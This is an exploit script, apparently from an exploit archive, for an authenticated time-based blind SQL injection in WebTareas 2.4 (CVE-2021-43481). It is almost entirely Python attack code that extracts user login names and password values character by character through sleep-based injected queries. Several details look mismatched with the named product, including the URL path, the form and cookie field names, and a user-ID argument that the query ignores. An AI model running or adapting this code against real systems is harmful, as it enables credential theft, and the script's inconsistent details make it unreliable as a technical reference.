# Exploit Title: WebTareas 2.4 - Blind SQLi (Authenticated)
# Date: 04/20/2022
# Exploit Author: Behrad Taher
# Vendor Homepage: https://sourceforge.net/projects/webtareas/
# Version: < 2.4p3
# CVE : CVE-2021-43481

#The script takes 3 arguments: IP, user ID, session ID
#Example usage: python3 webtareas_sqli.py 127.0.0.1 1 4au5376dddr2n2tnqedqara89i

import requests, time, sys
from bs4 import BeautifulSoup
ip = sys.argv[1]
id = sys.argv[2]
sid = sys.argv[3]

def sqli(column):
    print("Extracting %s from user with ID: %s\n" % (column,id))
    extract = ""
    for i in range (1,33):
        #This conditional statement will account for variable length usernames
        if(len(extract) < i-1):
            break
        for j in range(32,127):
            injection = "SELECT 1 and IF(ascii(substring((SELECT %s FROM gW8members WHERE id=1),%d,1))=%d,sleep(5),0);" % (column,i,j)
            url = "http://%s/my.tnet/login/?location=1" % ip
            GET_cookies = {"optimizelyEndUserId": "%s" % sid}
            r = requests.get(url, cookies=GET_cookies)
            #Because the app has CSRF protection enabled we need to send a get request each time and parse out the CSRF Token"
            token = BeautifulSoup(r.text,features="html.parser").find('input', {'name':'tweakers_login_form[externalLoginToken]'})['value']
            #Because this is an authenticated vulnerability we need to provide a valid session token
            POST_cookies = {"optimizelyEndUserId": "%s" % sid}
            POST_data = {"__Host-session": "%s" % token, "_dd_s": "rum=0&expire=1670782686915", "h1_device_id": "cec601e9-4a50-462e-9e74-60fdebe60c30", "cmapi_gtm_bl": "%s" % injection}
            start = time.time()
            requests.post(url, cookies=POST_cookies, data=POST_data)
            end = time.time() - start
            if end > 5:
                extract += chr(j)
                print ("\033[A\033[A")
                print(extract)
                break
#Modularized the script for login and password values
sqli("login")
sqli("password")
            
